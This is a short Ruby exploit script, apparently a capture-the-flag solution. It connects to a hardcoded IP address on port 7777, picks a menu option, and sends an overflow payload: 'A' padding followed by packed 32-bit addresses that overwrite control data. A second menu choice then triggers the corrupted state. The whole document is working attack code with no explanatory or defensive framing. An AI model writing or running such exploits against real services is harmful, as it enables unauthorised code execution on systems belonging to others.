require 'socket'

class Exploit
	def initialize
		@s = TCPSocket.new('125.131.189.30', 7777)

		Thread.new do
			loop do
				print @s.read(1)
			end
		end
	end	
	def add
		@s.write("1\n")

		id = pw = ""

		max = 0x100 - 4
		(max/4).times do |x|
			id +=  "%04X" % x
		end

		(max/4).times do |x|
			pw += "%04X" % (0x3fc + x)
		end
	
		id = "A"*(0x12 * 4)
		id += [0x08048520, 0x080486D4, 0x0804B080].pack('<I*')
		id = id.ljust(max, "C")
		@s.write(id + "\n")
		@s.write(pw + "\n")
		@s.flush
	end


	def trigger
		@s.write("5\n")
		@s.close_write
	end
end

s = Exploit.new
s.add
$stdin.readline
s.trigger
$stdin.readline
